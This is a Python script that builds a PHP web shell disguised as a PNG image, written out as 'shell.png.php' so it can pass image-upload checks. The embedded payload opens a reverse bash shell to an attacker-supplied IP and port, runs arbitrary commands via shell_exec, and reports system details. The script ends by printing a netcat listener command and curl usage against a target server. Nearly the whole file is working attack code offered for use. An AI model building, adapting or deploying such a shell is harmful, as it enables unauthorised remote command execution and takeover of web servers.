#!/usr/bin/env python3
"""
Generate PNG-disguised PHP webshell
The PNG header is written as raw bytes at the beginning of the file
"""

import struct

# PNG Header (valid 1x1 transparent PNG)
png_header = b'\x89PNG\r\n\x1a\n'
ihdr = b'IHDR'
width, height = 1, 1
bit_depth, color_type = 8, 2
compression, filter_val, interlace = 0, 0, 0

chunk_data = struct.pack('>IIBBBBB', width, height, bit_depth, color_type, compression, filter_val, interlace)
chunk_len = struct.pack('>I', len(chunk_data))
chunk_crc = struct.pack('>I', 0x0E1F7E6B)

# Complete PNG IHDR chunk
png_complete = png_header + chunk_len + ihdr + chunk_data + chunk_crc

# PHP Webshell code (NO opening PHP tag needed since PNG is not PHP)
php_code = '''?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PHP Web Shell - PNG Disguised</title>
    <style>
        * {
            box-sizing: border-box;
        }
        body {
            background: #0a0c10;
            font-family: 'Consolas', 'Monaco', monospace;
            color: #e4e6eb;
            padding: 20px;
            margin: 0;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        .header {
            background: linear-gradient(135deg, #1e1f2c, #161822);
            border-radius: 16px;
            padding: 20px;
            margin-bottom: 20px;
            border: 1px solid #2f3348;
        }
        h1 {
            margin: 0 0 5px 0;
            color: #ff6b6b;
            font-size: 1.8rem;
        }
        .sub {
            color: #8b92b0;
            font-size: 12px;
        }
        .card {
            background: #1e1f2c;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 20px;
            border: 1px solid #2f3348;
        }
        .card h3 {
            margin: 0 0 15px 0;
            color: #ffd93d;
            font-size: 1.2rem;
        }
        input, textarea, select {
            background: #0e0f17;
            border: 1px solid #2f3348;
            padding: 10px 12px;
            border-radius: 8px;
            color: #fff;
            font-family: monospace;
            font-size: 13px;
            width: 100%;
            margin-bottom: 10px;
        }
        button {
            background: #ff6b6b;
            border: none;
            padding: 10px 20px;
            border-radius: 8px;
            color: white;
            cursor: pointer;
            font-weight: bold;
            font-family: monospace;
            transition: all 0.2s;
        }
        button:hover {
            background: #ff5252;
            transform: translateY(-1px);
        }
        .btn-secondary {
            background: #2b8c5e;
        }
        .btn-secondary:hover {
            background: #3baa76;
        }
        .btn-info {
            background: #6b5b95;
        }
        .btn-info:hover {
            background: #7d6ba8;
        }
        .row {
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
        }
        .col {
            flex: 1;
            min-width: 200px;
        }
        pre {
            background: #0a0c10;
            padding: 10px;
            border-radius: 8px;
            overflow-x: auto;
            font-size: 11px;
            margin: 10px 0;
        }
        .badge {
            display: inline-block;
            padding: 2px 8px;
            border-radius: 12px;
            font-size: 10px;
            font-weight: bold;
            margin-left: 8px;
        }
        .badge.rev { background: #ff6b6b; }
        .badge.bind { background: #6b5b95; }
        .badge.cmd { background: #ffd93d; color: #1a1a2e; }
        .badge.png { background: #00ff9d; color: #1a1a2e; }
        .nav-buttons {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin-bottom: 20px;
        }
        .quick-cmds {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
            margin-top: 10px;
        }
        .quick-cmds button {
            background: #2c2f42;
            font-size: 11px;
            padding: 5px 10px;
        }
        .quick-cmds button:hover {
            background: #3a3f5c;
        }
        .png-note {
            background: #0e0f17;
            padding: 8px 12px;
            border-radius: 8px;
            font-size: 11px;
            margin-top: 10px;
            text-align: center;
            border: 1px dashed #2b8c5e;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>🐚 PHP Web Shell · PNG Disguised <span class="badge png">Valid PNG</span></h1>
        <div class="sub">Reverse Shell · Bind Shell · Command Execution · Process Info</div>
        <div class="png-note">
            📸 This file is a valid PNG image! Image viewers see a 1x1 transparent pixel.
        </div>
    </div>
    
    <div class="card">
        <h3>🔄 Reverse Shell <span class="badge rev">Connect Back</span></h3>
        <form method="POST">
            <div class="row">
                <div class="col">
                    <input type="text" name="reverse_ip" placeholder="LHOST (Your IP)" value="10.10.14.29">
                </div>
                <div class="col">
                    <input type="text" name="reverse_port" placeholder="LPORT" value="4444">
                </div>
            </div>
            <input type="hidden" name="action" value="reverse">
            <button type="submit">🚀 Execute Reverse Shell</button>
        </form>
        <?php
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] == 'reverse') {
            $ip = $_POST['reverse_ip'] ?? '10.10.14.29';
            $port = intval($_POST['reverse_port'] ?? 4444);
            $sock = @fsockopen($ip, $port, $errno, $errstr, 10);
            if ($sock) {
                $descriptorspec = array(0 => $sock, 1 => $sock, 2 => $sock);
                $process = proc_open('/bin/bash -i', $descriptorspec, $pipes);
                if (is_resource($process)) proc_close($process);
                fclose($sock);
                echo "<div style='background:#0e0f17; padding:10px; border-radius:8px; margin:10px 0;'>✅ Reverse shell attempted!</div>";
            } else {
                echo "<div style='background:#0e0f17; padding:10px; border-radius:8px; margin:10px 0;'>❌ Failed to connect to $ip:$port</div>";
            }
        }
        ?>
        <div style="margin-top: 10px; font-size: 11px; background: #0a0c10; padding: 8px; border-radius: 6px;">
            💡 Start listener: <code>nc -lvnp 4444</code>
        </div>
    </div>
    
    <div class="card">
        <h3>💻 Command Execution <span class="badge cmd">System Commands</span></h3>
        <form method="POST">
            <input type="text" name="cmd" placeholder="Enter command (whoami, id, ls -la)">
            <input type="hidden" name="action" value="cmd">
            <button type="submit" class="btn-secondary">⚡ Execute</button>
        </form>
        <?php
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] == 'cmd') {
            $cmd = $_POST['cmd'] ?? '';
            if ($cmd) {
                echo "<div style='background:#0e0f17; padding:12px; border-radius:8px; margin:10px 0;'>";
                echo "<strong>💻 Command:</strong> " . htmlspecialchars($cmd) . "<br>";
                echo "<strong>📟 Output:</strong><br>";
                echo "<pre style='background:#0a0c10; padding:10px; border-radius:6px;'>";
                echo htmlspecialchars(shell_exec($cmd . " 2>&1") ?: "(no output)");
                echo "</pre></div>";
            }
        }
        ?>
        <div class="quick-cmds">
            <button onclick="document.querySelector('input[name=\\\"cmd\\\"]').value='whoami'; this.form.submit();">whoami</button>
            <button onclick="document.querySelector('input[name=\\\"cmd\\\"]').value='id'; this.form.submit();">id</button>
            <button onclick="document.querySelector('input[name=\\\"cmd\\\"]').value='pwd'; this.form.submit();">pwd</button>
            <button onclick="document.querySelector('input[name=\\\"cmd\\\"]').value='ls -la'; this.form.submit();">ls -la</button>
            <button onclick="document.querySelector('input[name=\\\"cmd\\\"]').value='ps aux'; this.form.submit();">ps aux</button>
            <button onclick="document.querySelector('input[name=\\\"cmd\\\"]').value='uname -a'; this.form.submit();">uname -a</button>
        </div>
    </div>
    
    <div class="card">
        <h3>📊 System Information</h3>
        <pre style='background:#0a0c10; padding:10px; border-radius:6px;'><?php
            echo "OS: " . php_uname() . "\n";
            echo "PHP: " . phpversion() . "\n";
            echo "User: " . (exec('whoami 2>/dev/null') ?: get_current_user()) . "\n";
            echo "Dir: " . getcwd() . "\n";
            echo "Server: " . ($_SERVER['SERVER_SOFTWARE'] ?? 'CLI') . "\n";
        ?></pre>
    </div>
</div>
<script>
// Quick command helper
document.querySelectorAll('.quick-cmds button').forEach(btn => {
    btn.addEventListener('click', function(e) {
        e.preventDefault();
        let cmd = this.textContent;
        document.querySelector('input[name="cmd"]').value = cmd;
        document.querySelector('input[name="cmd"]').form.submit();
    });
});
</script>
</body>
</html>
'''

# Write the PNG-disguised PHP file
output_file = 'shell.png.php'

with open(output_file, 'wb') as f:
    # Write PNG header FIRST (raw bytes)
    f.write(png_complete)
    # Write PHP code (starts with ?> to close PHP, then HTML)
    f.write(php_code.encode('utf-8'))

print(f"✅ Created: {output_file}")
print(f"📏 Size: {len(png_complete) + len(php_code)} bytes")

# Verify it's recognized as PNG
import subprocess
result = subprocess.run(['file', output_file], capture_output=True, text=True)
print(f"🔍 File type: {result.stdout.strip()}")

print("\n📋 To upload and use:")
print(f"   curl -X POST http://target.com/{output_file} -d 'action=cmd&cmd=whoami'")
print(f"   Or open in browser: http://target.com/{output_file}")
